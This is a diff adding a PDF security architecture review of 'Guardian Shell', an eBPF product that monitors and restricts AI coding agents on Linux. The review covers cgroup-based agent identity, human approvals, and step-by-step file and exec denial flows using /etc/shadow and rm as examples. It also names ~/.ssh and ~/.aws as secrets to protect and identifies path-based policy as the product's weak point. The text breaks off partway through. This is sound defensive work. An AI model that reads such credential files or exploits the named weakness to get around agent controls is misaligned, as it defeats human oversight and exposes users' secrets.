@@ -1,0 +1,5055 @@
+%PDF-1.4
+%‚„œ”
+1 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+2 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>
+endobj
+4 0 obj
+<< /Length 2702 >>
+stream
+BT
+/F2 20 Tf
+1 0 0 1 54 732 Tm
+(Guardian Shell Security Architecture Review) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 698 Tm
+(Prepared for product and engineering review Date: March 13, 2026 Audience: Product) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 683 Tm
+(managers, security engineers, and platform engineers) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 652 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 634 Tm
+(Executive Summary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 606 Tm
+(Guardian Shell is a Linux security product for AI agents. It uses eBPF to observe agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 591 Tm
+(behavior at the kernel boundary and can block selected file and command actions.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 566 Tm
+(Its core value is not simply "kernel enforcement." Its real value is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 541 Tm
+(- governing a live AI agent session) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 520 Tm
+(- applying policy per agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 499 Tm
+(- tracking subprocesses) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 478 Tm
+(- supporting human approvals) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 457 Tm
+(- producing usable audit and operational visibility) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 436 Tm
+(This makes it different from traditional Linux controls and also different from products) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 421 Tm
+(such as Veto.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 396 Tm
+(The Short Verdict) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 373 Tm
+(Guardian Shell is already a credible foundation for agent governance on Linux.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 348 Tm
+(Its strongest qualities are:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 323 Tm
+(1. agent-centric identity, especially with cgroups) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 302 Tm
+(2. a practical product layer: approvals, dashboard, alerts, metrics, CLI) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 281 Tm
+(3. governance across files, commands, and network visibility) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 260 Tm
+(4. a realistic path toward stronger enforcement without discarding the product plane) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 239 Tm
+(Its biggest current weakness is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 214 Tm
+(1. too much trust still rests on path-based, tracepoint-first policy decisions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 193 Tm
+(The best path forward is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 168 Tm
+(1. keep the current product and control-plane design) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 147 Tm
+(2. move core file and exec decisions deeper into LSM-based canonical or inode-aware) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 132 Tm
+(   enforcement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 111 Tm
+(3. add seccomp as a standard hardening layer) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 1 of 30) Tj
+ET
+endstream
+endobj
+5 0 obj
+<< /Length 2861 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(4. make cgroup-backed identity the default secure mode) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(5. offer stronger isolation tiers for high-risk agents) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 666 Tm
+(Manager Quick Take) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 638 Tm
+(If a manager reads only the first few pages, these are the key points.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 613 Tm
+(What problem does Guardian Shell solve?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 590 Tm
+(It governs what a specific AI agent session can access on a Linux machine without) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 575 Tm
+(forcing the whole developer workflow into a heavy container or VM model.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 550 Tm
+(Why is that different from normal Linux permissions?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 527 Tm
+(Because Linux file permissions usually control what a user can access. Guardian Shell is) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 512 Tm
+(designed to control what one agent session can access, even if that agent is running) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 497 Tm
+(under the same user account as the developer.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 472 Tm
+(Why use eBPF for LLM agents?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 449 Tm
+(Because eBPF lets the product observe and enforce policy at the kernel boundary, per) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 434 Tm
+(agent session, in real time. That is what enables:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 409 Tm
+(- session-aware policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 388 Tm
+(- subprocess tracking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 367 Tm
+(- live audit trails) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 346 Tm
+(- temporary approvals) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 325 Tm
+(- dashboard visibility) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 304 Tm
+(Why not just use chmod, ACLs, AppArmor, or SELinux?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 281 Tm
+(Because those tools solve adjacent problems, not the entire product problem.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 256 Tm
+(- chmod and ACLs are useful baseline controls, but they are not session-aware) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 235 Tm
+(- AppArmor is a useful confinement layer, but not a natural per-agent workflow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 220 Tm
+(   product) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 199 Tm
+(- SELinux is a strong baseline MAC system, but not a PM-friendly dynamic approval) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 184 Tm
+(   layer) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 163 Tm
+(Is Guardian Shell stronger than Veto or SELinux?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 140 Tm
+(Not in every dimension.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 115 Tm
+(- Veto is stronger for binary identity and pre-exec blocking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 94 Tm
+(- SELinux is stronger as a mature baseline MAC framework) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 2 of 30) Tj
+ET
+endstream
+endobj
+6 0 obj
+<< /Length 2736 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 726 Tm
+(- Guardian Shell is stronger as an agent-centric governance and workflow product) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 705 Tm
+(What is the biggest current weakness?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 682 Tm
+(Path-based policy and tracepoint-first decision logic remain the main technical) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 667 Tm
+(weakness.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 642 Tm
+(What is the clearest improvement path?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 619 Tm
+(Keep the current product surface, but strengthen the trust anchor underneath it.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 570 Tm
+(How To Read This Report) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 542 Tm
+(This report is organized in seven parts:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 517 Tm
+(1. the problem and why eBPF is justified for LLM agents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 496 Tm
+(2. the current Guardian Shell architecture) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 475 Tm
+(3. agent identity and subprocess handling) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 454 Tm
+(4. comparison with Veto and related approaches) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 433 Tm
+(5. current limitations and security gaps) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 412 Tm
+(6. the proposed future architecture and why it is better) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(7. a technical primer and appendices for engineers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 370 Tm
+(The main narrative comes first. The technical reference material is later so the report) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 355 Tm
+(is easier to hand to either a PM or an engineer.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 324 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 306 Tm
+(The Problem Guardian Shell Is Trying To Solve) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 278 Tm
+(A coding agent running on a developer machine often inherits far more privilege than it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 263 Tm
+(actually needs.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 238 Tm
+(Example:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 213 Tm
+(- the agent only needs /workspace/project/**) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 192 Tm
+(- but the developer account can also read ~/.ssh/, ~/.aws/, browser cookies, .env) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 177 Tm
+(   files, kube configs, and internal documents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 156 Tm
+(Traditional UNIX permissions do not solve this cleanly when the developer and the agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 141 Tm
+(run under the same user account.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 116 Tm
+(If the user can read the file, the agent can usually read the file too.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 3 of 30) Tj
+ET
+endstream
+endobj
+7 0 obj
+<< /Length 3422 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(Guardian Shell exists to create a policy envelope around the agent without forcing every) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(workflow into a different runtime model.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 686 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 668 Tm
+(Why eBPF For LLM Agents Instead Of Only chmod, ACLs, AppArmor, or SELinux?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 640 Tm
+(This is one of the most important product questions:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 615 Tm
+("If Linux already has file permissions and security modules, why do we need an) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 600 Tm
+(eBPF-based product for LLM agents?") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 575 Tm
+(The short answer is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 550 Tm
+(Because LLM agents are not just another background process. They are dynamic,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 535 Tm
+(tool-using, subprocess-spawning, obstacle-solving actors that need session-level) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 520 Tm
+(governance, runtime observability, and approval workflows.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 495 Tm
+(Traditional Linux controls are still valuable, but by themselves they do not map cleanly) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 480 Tm
+(to the product problem.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 455 Tm
+(Simple Comparison Table) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 432 Tm
+(+----------------------+--------------------------------+----------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 420 Tm
+(| Option               | Good At                        | Weak For LLM Agent Use Case      |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 408 Tm
+(+----------------------+--------------------------------+----------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 396 Tm
+(| chmod/chown/ACLs     | baseline file permissions      | per-agent runtime governance     |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 384 Tm
+(| sticky bit           | shared directory hygiene       | session-aware control            |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 372 Tm
+(| AppArmor             | per-program path confinement   | dynamic per-agent approvals      |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 360 Tm
+(| SELinux              | strong label-based MAC         | product UX and agility           |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 348 Tm
+(| seccomp              | blocking dangerous syscalls    | rich file/resource policy        |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 336 Tm
+(| eBPF + product layer | runtime, agent-aware control   | needs kernel support and design  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 324 Tm
+(+----------------------+--------------------------------+----------------------------------+) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 304 Tm
+(Scenario 1: Developer and agent run as the same Linux user) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 281 Tm
+(Situation:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 256 Tm
+(- developer user: suren) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 235 Tm
+(- agent also runs as suren) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 214 Tm
+(- the user can read ~/.ssh/id_rsa) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 193 Tm
+(Question:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 168 Tm
+(Can chmod or ACLs stop only the agent from reading the key while still allowing the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 153 Tm
+(developer to use it normally?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 128 Tm
+(Usually no.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 103 Tm
+(Why:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 4 of 30) Tj
+ET
+endstream
+endobj
+8 0 obj
+<< /Length 2334 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- Linux DAC sees both as the same user) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- if suren can read the file, the agent process running as suren can too) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(Why eBPF helps:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 665 Tm
+(- Guardian Shell can identify the agent session by cgroup or process family) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 644 Tm
+(- it can apply policy to the agent, not to the human user account) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 623 Tm
+(Scenario 2: The agent spawns subprocesses during a coding task) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 600 Tm
+(The agent may launch:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 575 Tm
+(- bash) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 554 Tm
+(- python3) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 533 Tm
+(- git) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 512 Tm
+(- cargo) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 491 Tm
+(- node) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 470 Tm
+(Plain file permissions do not naturally express:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 445 Tm
+("All of these child processes belong to the same governed agent session.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 420 Tm
+(Why eBPF plus cgroups helps:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 395 Tm
+(- Guardian Shell can attach policy to the session boundary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 374 Tm
+(- the policy follows the cgroup or tracked process tree) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 353 Tm
+(Scenario 3: The manager wants temporary approval) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(Situation:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 305 Tm
+(The agent needs one blocked folder for 20 minutes to finish a migration.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 280 Tm
+(AppArmor, SELinux, or ACLs can technically be changed, but the product workflow is poor:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 255 Tm
+(- policy must be edited or ACLs must be changed) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 234 Tm
+(- rollback must be remembered manually) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 213 Tm
+(- audit explanation is awkward) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 192 Tm
+(Why Guardian Shell is better here:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 167 Tm
+(- the request appears in the dashboard or CLI) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 146 Tm
+(- access can be time-boxed) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 125 Tm
+(- the event is logged) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 104 Tm
+(- expiry is automatic) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 5 of 30) Tj
+ET
+endstream
+endobj
+9 0 obj
+<< /Length 3525 >>
+stream
+BT
+/F2 13 Tf
+1 0 0 1 54 732 Tm
+(Scenario 4: The organization already has SELinux) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(The right answer is not "replace SELinux.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 684 Tm
+(The better answer is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 659 Tm
+(- use SELinux for baseline host security) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 638 Tm
+(- use Guardian Shell's eBPF-based control plane for agent-specific governance) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 617 Tm
+(That is the most defensible layered security message.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 586 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 568 Tm
+(Current Guardian Shell Architecture) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 540 Tm
+(As of March 13, 2026, the repository shows a more advanced implementation than the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 525 Tm
+(original early README.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 500 Tm
+(The current codebase includes:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 475 Tm
+(- file monitoring through openat, openat2, and legacy open) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 454 Tm
+(- file blocking through the file_open LSM hook) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 433 Tm
+(- exec monitoring through execve) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 412 Tm
+(- exec blocking through the bprm_check_security LSM hook) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(- outbound network monitoring through connect) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 370 Tm
+(- identity by cgroup, TGID/process tree, and process name) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 349 Tm
+(- cgroup-based launcher and IPC registration) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 328 Tm
+(- web dashboard, alerts, metrics, and permission requests) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 307 Tm
+(High-Level Architecture Diagram) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 284 Tm
+(                         GUARDIAN SHELL TODAY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 260 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 248 Tm
+(  |                           User Space                              |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 236 Tm
+(  |                                                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 224 Tm
+(  |  guardian daemon                                                 |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 212 Tm
+(  |  - loads BPF programs                                            |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 200 Tm
+(  |  - parses policy                                                 |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 188 Tm
+(  |  - manages alerts/dashboard                                      |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 176 Tm
+(  |  - handles permission requests                                   |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 164 Tm
+(  |  - updates BPF maps                                              |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 152 Tm
+(  |                                                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 140 Tm
+(  |  guardian-launch                                                 |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 128 Tm
+(  |  - creates cgroup for an agent                                   |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 116 Tm
+(  |  - applies resource limits                                       |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 104 Tm
+(  |  - registers cgroup with daemon                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 92 Tm
+(  |                                                                  |) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 6 of 30) Tj
+ET
+endstream
+endobj
+10 0 obj
+<< /Length 4517 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  |  guardian-ctl                                                    |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  |  - CLI for listing, granting, stopping, reviewing                |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  +-------------------------------+----------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(                                  | perf events, IPC, BPF map updates) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(                                  v) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(  |                           Kernel Space                            |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  |                                                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(  |  Tracepoints                                                     |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(  |  - sys_enter_openat/openat2/open                                 |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(  |  - sys_enter_execve                                               |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(  |  - sys_enter_connect                                              |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(  |  - sched_process_fork / exit                                      |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(  |                                                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(  |  LSM hooks                                                       |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 540 Tm
+(  |  - file_open                                                     |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 528 Tm
+(  |  - bprm_check_security                                           |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 516 Tm
+(  |                                                                  |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(  |  BPF maps                                                        |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 492 Tm
+(  |  - watched/enforced comms                                        |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(  |  - watched/enforced TGIDs                                        |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(  |  - watched/enforced cgroups                                      |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 456 Tm
+(  |  - allow/deny path maps                                          |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 444 Tm
+(  |  - pending deny maps                                             |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 432 Tm
+(  +------------------------------------------------------------------+) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 412 Tm
+(What The Current Architecture Gets Right) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 389 Tm
+(1. It is built around the agent as the primary object of governance.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 368 Tm
+(2. It already has a usable operations plane.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 347 Tm
+(3. It supports multiple policy domains in one product.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 326 Tm
+(4. It allows gradual hardening without throwing away the current daemon, UI, or) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 311 Tm
+(   workflow model.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 290 Tm
+(How A File Decision Works Today) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 267 Tm
+(1. Agent calls open\("/etc/shadow"\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 255 Tm
+(2. Tracepoint sees the raw filename string) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 243 Tm
+(3. Tracepoint checks policy maps) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 231 Tm
+(4. If policy says deny, tracepoint writes PENDING_DENY for this pid/tgid) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 219 Tm
+(5. LSM file_open hook runs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 207 Tm
+(6. LSM checks PENDING_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 195 Tm
+(7. If present, kernel returns EACCES and the open fails) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 175 Tm
+(How An Exec Decision Works Today) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 152 Tm
+(1. Agent calls execve\("/usr/bin/rm", ...\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 140 Tm
+(2. Tracepoint sees the raw path) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 128 Tm
+(3. Tracepoint evaluates exec policy) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 116 Tm
+(4. If denied, tracepoint writes PENDING_EXEC_DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 104 Tm
+(5. LSM bprm_check_security runs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 92 Tm
+(6. LSM checks the pending map) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 7 of 30) Tj
+ET
+endstream
+endobj
+11 0 obj
+<< /Length 2381 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(7. If present, exec is blocked) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 712 Tm
+(Current Architecture Strengths) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 689 Tm
+(#### Strength 1: Strong agent attribution) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 664 Tm
+(This is one of the best parts of the design.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 639 Tm
+(The system supports cgroups and process-family reasoning instead of relying only on one) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 624 Tm
+(process name.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 599 Tm
+(#### Strength 2: One place for multiple policy types) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 574 Tm
